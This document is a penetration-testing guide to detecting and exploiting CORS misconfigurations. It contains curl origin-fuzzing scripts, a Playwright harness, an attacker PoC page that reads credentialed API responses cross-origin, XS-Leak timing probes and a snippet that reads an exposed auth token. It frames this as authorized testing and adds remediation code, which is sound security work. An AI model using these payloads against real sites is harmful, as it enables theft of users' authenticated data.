# CORS Misconfiguration — Ultimate Advanced Detection & Exploitation

> Complete field guide for CORS misconfiguration detection, validation, and exploitation.
> Based on the Master Edition methodology — covers basic to ultimate advanced techniques.
> All testing via Caido proxy (`-x "http://localhost:8080"`).

---

## Quick Detection (Caido)

```bash
# 1. Basic origin reflection test
curl -x "http://localhost:8080" -i -H "Origin: https://attacker.example" \
  https://target.com/api/profile

# 2. Null origin test
curl -x "http://localhost:8080" -i -H "Origin: null" \
  https://target.com/api/profile

# 3. Preflight test
curl -x "http://localhost:8080" -i -X OPTIONS \
  -H "Origin: https://attacker.example" \
  -H "Access-Control-Request-Method: PUT" \
  -H "Access-Control-Request-Headers: authorization,content-type" \
  https://target.com/api/profile

# 4. Credentialed test (with test account cookie)
curl -x "http://localhost:8080" -i -H "Origin: https://attacker.example" \
  -H "Cookie: session=TEST_ACCOUNT_SESSION" \
  https://target.com/api/profile
```

**Confirmed if:**
- `Access-Control-Allow-Origin: https://attacker.example` (reflected)
- `Access-Control-Allow-Credentials: true`
- Response contains sensitive authenticated data

---

## PART I — FOUNDATIONS

### Key CORS Headers

| Header | Purpose | Vulnerable Pattern |
|--------|---------|-------------------|
| `Origin` | Browser-sent request origin | `Origin: https://attacker.example` |
| `Access-Control-Allow-Origin` (ACAO) | Allowed response origin | `https://attacker.example` (reflected) or `*` |
| `Access-Control-Allow-Credentials` (ACAC) | Allow credentialed responses | `true` |
| `Access-Control-Allow-Methods` | Allowed methods for preflight | `GET, POST, PUT, DELETE` |
| `Access-Control-Allow-Headers` | Allowed request headers | `Authorization, Content-Type` |
| `Access-Control-Expose-Headers` | Headers readable by JS | `X-Auth-Token, X-User-ID` |
| `Access-Control-Max-Age` | Preflight cache duration | `3600` |
| `Vary: Origin` | Cache differentiation | Must be present when ACAO varies |
| `Timing-Allow-Origin` | Resource Timing access | `*` or specific origin |

### Misconfiguration Classification

| Class | Description | Validation Required |
|-------|-------------|---------------------|
| **Arbitrary Origin Reflection** | Server reflects any Origin | Test with controlled origin |
| **Null-Origin Trust** | `ACAO: null` + `ACAC: true` | Sandboxed iframe test |
| **Weak Origin Validation** | Substring/prefix/suffix matching | Parser differential testing |
| **Subdomain Trust** | `*.example.com` or all subdomains | Subdomain takeover check |
| **HTTP Origin Trust** | HTTP origin on HTTPS API | Mixed-content + cookie test |
| **Wildcard CORS** | `ACAO: *` (no credentials) | Unauthenticated sensitive data? |
| **Credentialed CORS** | Reflected origin + `ACAC: true` | Browser test with cookies |
| **Permissive Preflight** | Overly broad methods/headers | Actual request validation |
| **Error-Response CORS** | Different CORS on errors | Test 401, 403, 500, etc. |

---

## PART II — RECONNAISSANCE & BASIC TESTING

### Endpoint Discovery Priority

```bash
# 1. Discover sensitive endpoints via Caido
curl -x "http://localhost:8080" -s "https://target.com" | \
  grep -oE '/api/[^"'\''<> ]+' | sort -u

# 2. Priority endpoints
/api/profile
/api/account
/api/users/me
/api/settings
/api/billing
/api/payment-methods
/api/orders
/api/transactions
/api/tokens
/api/keys
/api/admin
/api/organization
/api/members
/graphql
```

### Baseline Recording

For each endpoint, record via Caido:
```bash
curl -x "http://localhost:8080" -sS -D - -o /dev/null \
  -H "Origin: https://attacker.example" \
  "https://target.com/api/profile"
```

Record:
- Status code
- `Access-Control-Allow-Origin`
- `Access-Control-Allow-Credentials`
- `Vary`
- `Access-Control-Expose-Headers`
- Response sensitivity

---

## PART III — MASTER ORIGIN TESTING MATRIX (via Caido)

```bash
#!/usr/bin/env bash
# cors-master-test.sh — Run against authorized endpoints only

TARGET="https://target.com/api/profile"
ORIGINS=(
  "https://attacker.example"           # Untrusted
  "null"                                # Null origin
  "https://unrelated.example"          # Unrelated
  "http://target.com"                  # HTTP origin
  "https://target.com:8443"            # Alternate port
  "https://sub.target.com"             # Subdomain
  "https://target.com.attacker.example" # Suffix confusion
  "https://target-example.com"         # Prefix confusion
  "https://TARGET.COM"                 # Case variation
  "https://target.com."                # Trailing dot
  "https://target.com:443"             # Default port
  "https://target.com@attacker.example" # User-info
  "https://[::1]"                      # IPv6
)

for origin in "${ORIGINS[@]}"; do
  echo "========================================"
  echo "Testing Origin: $origin"
  echo "========================================"
  curl -x "http://localhost:8080" -sS --max-time 15 -D - -o /dev/null \
    -H "Origin: $origin" "$TARGET" | \
    grep -Ei '^(HTTP/|access-control-|vary:|timing-allow-origin:|cache-control:|location:)'
  echo
done
```

### Critical Validation

```bash
# Only browser-sent origins are exploitable
# Malformed origins (suffix/prefix) test server-side parser only
# Must find browser-realistic origin that triggers same unsafe decision
```

---

## PART IV — BROWSER VALIDATION (Required)

### Playwright Validation Script

```javascript
// cors-poc.js — Run with: npx playwright cors-poc.js
const { chromium, firefox, webkit } = require('playwright');

const TARGET_ENDPOINT = 'https://target.com/api/profile';
const ATTACKER_ORIGIN = 'https://attacker.example';

async function testBrowser(browserType, name) {
  const browser = await browserType.launch({ headless: true });
  const context = await browser.newContext();
  const page = await context.newPage();

  // 1. Login with test account
  await page.goto('https://target.com/login');
  await page.fill('input[name="email"]', process.env.TEST_EMAIL);
  await page.fill('input[name="password"]', process.env.TEST_PASS);
  await page.click('button[type="submit"]');
  await page.waitForURL('**/dashboard');

  // 2. Load attacker PoC page
  await page.goto(`${ATTACKER_ORIGIN}/cors-poc.html`);

  // 3. Wait for PoC execution
  const result = await page.evaluate(() => window.__corsResult);

  console.log(`${name}:`, result);
  await browser.close();
  return result;
}

(async () => {
  await testBrowser(chromium, 'Chromium');
  await testBrowser(firefox, 'Firefox');
  await testBrowser(webkit, 'WebKit');
})();
```

### Attacker PoC Page (`cors-poc.html`)

```html
<!DOCTYPE html>
<html>
<head><title>CORS Validation</title></head>
<body>
  <h2>CORS Validation</h2>
  <pre id="result">Testing...</pre>
  <script>
    window.__corsResult = null;
    const TARGET = "https://target.com/api/profile";

    fetch(TARGET, { method: "GET", credentials: "include" })
      .then(async r => {
        const body = await r.text();
        window.__corsResult = {
          ok: true,
          status: r.status,
          readable: true,
          bodyPreview: body.substring(0, 500)
        };
        document.getElementById("result").textContent =
          "Status: " + r.status + "\n\n" + body;
      })
      .catch(e => {
        window.__corsResult = { ok: false, error: String(e) };
        document.getElementById("result").textContent = "Blocked: " + e;
      });
  </script>
</body>
</html>
```

### Browser Matrix Documentation

| Browser | Version | Exploitable | Notes |
|---------|---------|-------------|-------|
| Chrome | 130+ | ✅/❌ | Third-party cookie phase-out |
| Firefox | 131+ | ✅/❌ | Total Cookie Protection |
| Safari | 17+ | ✅/❌ | ITP strict |
| Edge | 130+ | ✅/❌ | Mirrors Chrome |

---

## PART V — ADVANCED TECHNIQUES

### 1. Redirect-Chain CORS Testing

```bash
# Test redirects on sensitive endpoints
curl -x "http://localhost:8080" -sS -D - -o /dev/null \
  -H "Origin: https://attacker.example" \
  "https://target.com/api/profile"

# Check each redirect:
# - Initial CORS headers
# - Redirect Location
# - Final CORS headers
# - Browser follows redirect?
```

### 2. CDN/Proxy/WAF Inconsistencies

```bash
# Test for duplicate headers, cache behavior
curl -x "http://localhost:8080" -sS -D - -o /dev/null \
  -H "Origin: https://attacker.example" \
  "https://target.com/api/profile" | \
  grep -iE 'access-control-|vary:|age:|via:|x-cache:|x-cache-hits:|server:'

# Repeat request - check for cached response reuse across origins
```

### 3. Error-Response CORS

```bash
# Test different status codes
for status in 200 401 403 404 500; do
  echo "Testing $status..."
  # Trigger specific error (e.g., 401 with invalid token)
  curl -x "http://localhost:8080" -sS -D - -o /dev/null \
    -H "Origin: https://attacker.example" \
    -H "Authorization: Bearer invalid" \
    "https://target.com/api/profile"
done
```

### 4. Origin Parser Differential Testing

```bash
# Test parser differences between components
ORIGINS=(
  "https://TARGET.COM"
  "https://target.com."
  "https://target.com:443"
  "https://target.com@attacker.example"
  "https://target.com.attacker.example"
  "https://target-example.com"
)

for o in "${ORIGINS[@]}"; do
  curl -x "http://localhost:8080" -sS -D - -o /dev/null \
    -H "Origin: $o" "https://target.com/api/profile" | \
    grep -i access-control-allow-origin
done

# Find browser-realistic payload that reaches same unsafe decision
```

### 5. Authentication-State Differential

```bash
# Test with different auth states
STATES=(
  "logged_out"
  "account_a"
  "account_b"
  "expired_session"
  "revoked_session"
)

for state in "${STATES[@]}"; do
  COOKIE=$(get_cookie_for_state "$state")
  curl -x "http://localhost:8080" -sS -D - -o /dev/null \
    -H "Origin: https://attacker.example" \
    -H "Cookie: $COOKIE" \
    "https://target.com/api/profile" | \
    grep -iE 'access-control-|vary:|status:'
done
```

---

## PART VI — ULTIMATE ADVANCED (V4.0)

### 1. DNS Rebinding + CORS

```bash
# Check if target reachable from browser
# Does it validate Host header?
curl -x "http://localhost:8080" -sS -D - -o /dev/null \
  -H "Host: internal-target" \
  "https://target.com/api/admin"

# If Host header not validated + CORS permissive = DNS rebinding path
```

### 2. XS-Leaks + CORS

```javascript
// Timing attack even under no-cors
async function probe(url) {
  const t0 = performance.now();
  try {
    await fetch(url, { credentials: "include", mode: "no-cors" });
    return { status: "loaded", time: performance.now() - t0 };
  } catch (e) {
    return { status: "error", time: performance.now() - t0 };
  }
}

// Cache probing
// transferSize === 0 indicates cache hit
```

### 3. JSONP / XSSI Detection

```bash
# Test callback parameters
for param in callback jsonp cb jsoncallback format _ wrap; do
  curl -x "http://localhost:8080" -s "https://target.com/api/data?$param=test" | \
    grep -q "test({" && echo "JSONP: $param"
done
```

### 4. Service Worker Scope

```bash
# Check for service worker on trusted origins
curl -x "http://localhost:8080" -s "https://target.com/sw.js"
curl -x "http://localhost:8080" -s "https://target.com/service-worker.js"
# If exists + XSS on subdomain = service worker intercepts CORS
```

### 5. postMessage Origin Validation

```html
<!-- Test page -->
<iframe src="https://target.com" id="target"></iframe>
<script>
  window.addEventListener("message", e => console.log("Origin:", e.origin, "Data:", e.data));
  setInterval(() => document.getElementById("target").contentWindow.postMessage("ping", "*"), 1000);
</script>
```

### 6. CORP/COEP/COOP Interaction

```bash
# Check for these headers
curl -x "http://localhost:8080" -sS -D - -o /dev/null \
  "https://target.com/api/profile" | \
  grep -iE 'cross-origin-resource-policy|cross-origin-embedder-policy|cross-origin-opener-policy'

# CORP: same-origin = blocks cross-origin load
# COEP: require-corp = requires CORP/CORS
# COOP: same-origin = blocks opener access
```

### 7. Access-Control-Expose-Headers

```bash
# Check for sensitive header exposure
curl -x "http://localhost:8080" -sS -D - -o /dev/null \
  -H "Origin: https://attacker.example" \
  "https://target.com/api/login" | \
  grep -i access-control-expose-headers

# Test reading exposed headers
fetch("https://target.com/api/login", { credentials: "include", method: "POST", body: "..." })
  .then(r => console.log("Token:", r.headers.get("X-Auth-Token")));
```

### 8. Timing-Allow-Origin

```bash
# Check for resource timing leaks
curl -x "http://localhost:8080" -sS -D - -o /dev/null \
  "https://target.com/api/profile" | \
  grep -i timing-allow-origin

# transferSize === 0 = cache hit (XS-Leak)
```

---

## PART VII — AUTOMATION & DETECTION

### Nuclei Template

```yaml
# cors-misconfig.yaml
id: cors-misconfig
info:
  name: CORS Misconfiguration Detection
  severity: info
  tags: cors
http:
  - method: GET
    path:
      - "{{BaseURL}}"
    headers:
      Origin: "https://attacker.example"
    matchers:
      - type: regex
        part: header
        regex:
          - "(?i)access-control-allow-origin:\\s*https://attacker\\.example"
          - "(?i)access-control-allow-credentials:\\s*true"
```

### CorScanner Integration

```bash
# Run CorScanner via Caido
docker run --rm -v $(pwd):/data corscanner \
  -t "https://target.com/api/profile" \
  -p "http://localhost:8080"
```

---

## PART VIII — FALSE POSITIVE ELIMINATION

### Decision Tree

```
1. Untrusted origin accepted?
   NO → Not CORS issue
   YES → Continue

2. Endpoint sensitive?
   NO → Informational
   YES → Continue

3. Requires authentication?
   NO → Test unauthenticated browser readability
   YES → Continue

4. Browser sends eligible credentials?
   NO → Credentialed path not established
   YES → Continue

5. JavaScript reads response?
   NO → Not confirmed CORS exposure
   YES → Continue

6. Meaningful sensitive data exposed?
   NO → Impact not established
   YES → CONFIRMED

7. Browser matrix?
   Document: Chrome ✅, Firefox ❌, Safari ❌, Edge ✅
```

### Common False Positives

| Observation | Why Not Vulnerable | Required Validation |
|-------------|-------------------|---------------------|
| `ACAO: *` | No credentialed sharing | Unauthenticated sensitive data? |
| `ACAC: true` alone | No untrusted origin allowed | Combined with reflected ACAO? |
| Reflected Origin | May not carry credentials | Test with test account cookies |
| Permissive OPTIONS | Actual request may differ | Test actual GET/POST |
| curl succeeds | No browser CORS enforcement | Playwright browser test |
| Missing `Vary` | No cache poisoning proven | Demonstrate cross-origin cache reuse |

---

## PART IX — REPORTING

### Title Formula
```
CORS Misconfiguration Allows Untrusted Origin to Read Sensitive Authenticated API Response
```

### Evidence Required

1. **Request**: `GET /api/profile` + `Origin: https://attacker.example`
2. **Response Headers**: `ACAO: https://attacker.example`, `ACAC: true`
3. **Response Body**: Sensitive data (test account)
4. **Browser Validation**: Playwright output per browser
5. **Cookie Behavior**: SameSite, Secure, third-party cookie status
6. **Impact**: Exact data exposed (email, tokens, PII, etc.)

### Severity Assessment

| Severity | Criteria |
|----------|----------|
| **Critical** | Reliable account compromise chain |
| **High** | Sensitive account data readable (tokens, PII, billing) |
| **Medium** | Limited authenticated data exposed |
| **Low** | Non-sensitive data, restricted impact |
| **Info** | CORS headers present, no sensitive exposure |

### Remediation Template

```javascript
// Strict allowlist validation
const ALLOWED_ORIGINS = new Set([
  'https://app.target.com',
  'https://admin.target.com'
]);

function validateOrigin(origin) {
  try {
    const url = new URL(origin);
    // Exact match on scheme, hostname, port
    return ALLOWED_ORIGINS.has(`${url.protocol}//${url.host}`);
  } catch {
    return false;
  }
}

app.use((req, res, next) => {
  const origin = req.headers.origin;
  if (validateOrigin(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
    res.setHeader('Vary', 'Origin');
  }
  next();
});
```

---

## PART X — TESTING CHECKLIST

### Recon
- [ ] Identify API hosts
- [ ] Identify sensitive endpoints
- [ ] Record baseline CORS behavior

### Origin Testing
- [ ] Trusted origin
- [ ] Untrusted origin
- [ ] Null origin
- [ ] HTTP origin
- [ ] Subdomain origin
- [ ] Prefix/suffix confusion
- [ ] Case/trailing dot/port variations

### Header Testing
- [ ] ACAO
- [ ] ACAC
- [ ] Allow-Methods/Headers
- [ ] Expose-Headers
- [ ] Vary: Origin
- [ ] Timing-Allow-Origin
- [ ] Duplicate headers

### Request Testing
- [ ] GET, POST, PUT, PATCH, DELETE
- [ ] Simple vs preflight
- [ ] Form, JSON, multipart
- [ ] Authorization header

### Browser Testing
- [ ] Controlled attacker origin
- [ ] Test account login
- [ ] `credentials: include`
- [ ] JavaScript reads response
- [ ] Sensitive data identified
- [ ] Multi-browser (Chrome, Firefox, Safari, Edge)

### Advanced
- [ ] Redirect chains
- [ ] Preflight cache
- [ ] CDN/proxy inconsistency
- [ ] Error-response CORS
- [ ] Auth-state differential
- [ ] API version/host diff
- [ ] Origin parser differential
- [ ] DNS rebinding reachability
- [ ] XS-Leaks timing
- [ ] JSONP/XSSI
- [ ] Service worker scope
- [ ] postMessage validation
- [ ] CORP/COEP/COOP
- [ ] Expose-Headers
- [ ] Timing-Allow-Origin

### Validation
- [ ] False positives eliminated
- [ ] Browser matrix documented
- [ ] Impact demonstrated with test data
- [ ] Evidence collected

---

## PART XI — QUICK REFERENCE

### Critical curl Commands (via Caido)

```bash
# All via: curl -x "http://localhost:8080" ...

# Basic test
-H "Origin: https://attacker.example"

# Null origin
-H "Origin: null"

# Preflight
-X OPTIONS -H "Access-Control-Request-Method: PUT" -H "Access-Control-Request-Headers: authorization"

# Credentialed
-H "Cookie: session=TEST_SESSION"

# Headers only
-sS -D - -o /dev/null

# Follow redirects
-L

# Timeout
--max-time 15
```

### Key Header Patterns

```
VULNERABLE:
Access-Control-Allow-Origin: https://attacker.example
Access-Control-Allow-Credentials: true

NOT VULNERABLE (alone):
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true

SAFE:
Access-Control-Allow-Origin: https://trusted.example
Vary: Origin
```

---

## PART XII — TOOLS INTEGRATION

| Tool | Caido Integration |
|------|-------------------|
| `curl` | `-x "http://localhost:8080"` |
| `httpx` | `-proxy "http://localhost:8080"` |
| `nuclei` | `-proxy "http://localhost:8080"` |
| `katana` | `-proxy "http://localhost:8080"` |
| `gau` | `--proxy "http://localhost:8080"` |
| `ffuf` | `-x "http://localhost:8080"` |
| `sqlmap` | `--proxy "http://localhost:8080"` |
| `playwright` | Launch via Caido proxy context |
| `interactsh` | `-proxy "http://localhost:8080"` |

---

> **Remember**: A permissive CORS header is not a vulnerability. A browser-readable sensitive response from an untrusted origin IS.
> Always validate in a real browser with test accounts. Document the browser matrix.